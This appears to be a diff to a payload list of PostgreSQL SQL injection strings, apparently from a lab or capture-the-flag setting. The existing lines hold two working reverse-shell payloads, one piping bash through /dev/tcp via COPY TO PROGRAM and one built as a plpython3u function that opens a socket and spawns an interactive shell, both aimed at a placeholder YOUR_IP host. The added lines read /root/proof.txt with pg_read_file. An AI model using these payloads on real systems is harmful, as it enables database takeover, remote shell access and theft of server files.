@@ -11,3 +11,8 @@
 ------------------
 '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"'; --
 '; CREATE OR REPLACE FUNCTION rev_shell() RETURNS void AS 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' LANGUAGE plpython3u; SELECT rev_shell(); --
+
+'; SELECT pg_read_file('/root/proof.txt', 0, 1000000); --
+'; SELECT pg_read_file('/root/proof.txt'); --
+'; COPY (SELECT content FROM (SELECT pg_read_file('/root/proof.txt') as content) t) TO stdout; --
+'; SELECT pg_read_file('/root/proof.txt'); --
